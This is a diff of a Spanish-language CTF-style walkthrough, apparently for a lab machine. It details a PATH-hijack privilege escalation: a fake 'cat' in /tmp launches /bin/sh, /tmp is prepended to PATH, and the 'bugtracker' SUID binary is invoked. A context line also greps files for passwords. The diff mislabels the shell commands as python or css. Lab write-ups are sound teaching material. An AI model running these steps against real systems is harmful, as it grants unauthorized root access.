@@ -494,28 +494,28 @@ cat * | grep -i passw*
 
 ![[2023-10-09_01-18.png]]
 ### Navegaremos al directorio /tmp y crearemos un archivo llamado cat con el siguiente contenido: 
-```css
+```python
 	/bin/sh
 ```
 
 ### ahora otorgamos permisos de ejecución  
-```css
+```python
 	chmod +x cat
 ```
 
-##### Para explotar esto, podemos añadir el directorio /tmp a la variable de entorno PATH
-```c
+###### Para explotar esto, podemos añadir el directorio /tmp a la variable de entorno PATH
+```python
 	export PATH=/tmp:$PATH
 ```
 
-##### haciendo echo $PATH podemos ver 
-```c
+###### haciendo echo $PATH podemos ver 
+```python
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
 ```
-##### podemos ver que el directorio /tmp esta alojado dentro de la variable path
+###### podemos ver que el directorio /tmp esta alojado dentro de la variable path
 
-#### hacemos un nuevo llamado al bugtracker 
-```css
+###### hacemos un nuevo llamado al bugtracker 
+```python
 bugtracker --help
 ```
 ###### seleccionamos la opción numero 2
